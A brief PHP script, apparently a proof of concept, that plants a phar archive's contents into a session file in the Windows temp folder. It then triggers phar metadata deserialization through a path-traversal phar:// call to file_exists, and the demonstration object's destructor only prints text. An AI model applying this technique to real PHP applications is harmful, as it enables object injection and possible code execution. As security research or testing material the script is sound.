<?php
class TestObject
{
function __destruct()
{
echo "DESTRUCT!\n";
}
}

session_save_path("c:\\windows\\temp\\");
session_start();
$_SESSION["test"]=substr(file_get_contents("phar.tar.phar"),13);
session_write_close();
	
file_exists("phar://../../../../../../../windows/temp/sess_" . session_id(). ". /test.txt");
?>